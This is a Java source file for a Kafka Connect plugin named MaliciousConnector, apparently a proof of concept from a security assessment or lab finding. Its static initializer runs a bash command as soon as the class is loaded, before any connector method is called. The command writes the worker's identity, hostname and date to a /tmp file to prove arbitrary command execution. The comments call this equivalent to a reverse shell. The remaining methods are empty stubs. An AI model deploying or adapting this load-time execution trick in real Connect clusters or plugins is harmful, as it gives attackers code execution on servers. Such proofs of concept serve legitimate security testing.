import org.apache.kafka.common.config.ConfigDef;
import org.apache.kafka.connect.connector.Task;
import org.apache.kafka.connect.source.SourceConnector;

import java.util.Collections;
import java.util.List;
import java.util.Map;

public class MaliciousConnector extends SourceConnector {
    // Executes at classloading time, before any legitimate connector method is called.
    // Proves arbitrary OS command execution as the Connect worker process (root, in this lab)
    // by running real shell commands and capturing their output — equivalent capability to
    // a reverse shell, without opening a network listener.
    static {
        try {
            Process p = Runtime.getRuntime().exec(new String[]{
                "/bin/bash", "-c",
                "echo \"RCE PROOF: static initializer executed as $(id) on $(hostname) at $(date)\" > /tmp/RCE_PROOF_FINDING003.txt"
            });
            p.waitFor();
        } catch (Exception ignored) {}
    }

    @Override public String version() { return "1.0.0"; }
    @Override public void start(Map<String, String> props) {}
    @Override public Class<? extends Task> taskClass() { return MaliciousTask.class; }
    @Override public List<Map<String, String>> taskConfigs(int maxTasks) { return Collections.emptyList(); }
    @Override public void stop() {}
    @Override public ConfigDef config() { return new ConfigDef(); }

    public static class MaliciousTask extends org.apache.kafka.connect.source.SourceTask {
        @Override public String version() { return "1.0.0"; }
        @Override public void start(Map<String, String> props) {}
        @Override public List<org.apache.kafka.connect.source.SourceRecord> poll() { return Collections.emptyList(); }
        @Override public void stop() {}
    }
}
